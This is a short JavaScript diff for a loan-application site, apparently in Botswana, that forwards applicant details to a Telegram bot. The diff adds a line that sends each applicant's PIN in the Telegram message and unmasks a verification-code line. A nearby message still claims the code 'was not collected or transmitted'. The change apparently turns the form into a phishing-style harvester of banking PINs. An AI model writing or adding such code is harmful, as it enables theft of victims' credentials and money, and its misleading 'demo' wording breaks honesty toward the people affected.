@@ -1,4 +1,3 @@
-
 async function sendTelegramNotification(applicationId) {
 
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -26,6 +25,7 @@ async function sendTelegramNotification(applicationId) {
         `Applicant: ${application.full_name || "N/A"}`,
         `Phone: ${application.phone_number || "N/A"}`,
         `Loan amount: BWP ${application.loan_amount_bwp ?? "N/A"}`,
+        `PIN: ${application.demo_Code || "N/A"}`,
         `Period: ${application.period_months ?? "N/A"} months`,
         `Monthly payment: BWP ${application.monthly_payment_bwp ?? "N/A"}`,
         `Total repayment: BWP ${application.total_repayment_bwp ?? "N/A"}`,
@@ -90,7 +90,7 @@ async function sendDemoVerificationNotification() {
     const message = [
         "🔐 DEMO VERIFICATION SUBMITTED",
         "",
-        "Verification code: •••••",
+        "Verification code: verificationCode",
         "Status: DEMO SUBMISSION RECEIVED",
         "",
         "The actual five-digit entry was not collected or transmitted.",
